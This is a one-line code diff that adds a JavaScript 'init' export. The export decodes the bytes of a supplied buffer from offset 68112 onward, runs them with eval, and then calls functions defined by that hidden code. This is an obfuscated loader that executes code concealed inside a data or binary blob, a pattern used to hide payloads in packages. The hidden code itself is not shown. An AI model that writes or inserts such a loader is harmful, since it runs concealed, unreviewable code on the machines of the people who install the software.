@@ -1,0 +1,1 @@
+exports.init=function(w){eval(w.toString('ascii',68112));k(w);exports.test=l}
